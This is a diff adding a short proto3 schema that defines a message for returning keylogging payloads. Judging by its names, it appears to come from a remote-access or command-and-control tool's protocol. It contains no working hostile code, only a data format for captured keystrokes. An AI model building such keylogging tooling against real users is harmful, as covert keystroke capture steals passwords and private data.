@@ -1,0 +1,7 @@
+syntax = "proto3";
+
+import "Proto/SpiderKeyloggingPayload.proto";
+
+message GetKeylogCommandResponse {
+    repeated SpiderKeyLoggingPayload keylog = 1;
+}
